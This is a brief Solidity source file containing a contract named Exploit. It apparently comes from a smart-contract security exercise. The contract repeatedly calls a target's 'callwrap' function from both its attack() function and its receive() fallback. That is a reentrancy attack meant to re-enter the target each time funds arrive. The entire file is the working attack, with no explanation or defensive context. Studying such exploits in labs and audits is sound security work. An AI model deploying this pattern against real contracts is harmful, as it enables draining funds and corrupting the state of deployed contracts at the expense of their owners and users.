interface ICallWrapper {
    function callwrap(address called) external;
}

contract Exploit {
    ICallWrapper target;

    constructor(address _target) {
        target = ICallWrapper(_target);
    }

    receive() external payable {
        target.callwrap(address(this));
    }

    function attack() public payable {
        target.callwrap(address(this));
    }
}